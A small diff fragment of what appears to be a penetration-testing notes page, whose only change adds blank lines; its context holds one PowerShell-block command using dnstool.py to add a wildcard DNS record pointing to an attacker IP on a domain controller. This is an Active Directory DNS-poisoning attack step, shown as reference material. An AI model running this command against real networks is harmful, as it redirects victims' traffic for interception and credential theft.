@@ -14,3 +14,5 @@ updated_at: '2023-04-10T20:26:13.841497+00:00'
 ```ps1
 dnstool.py -u 'DOMAIN\user' -p 'password' --record '*' --action add --data $AttackerIP $DomainController
 ```
+
+
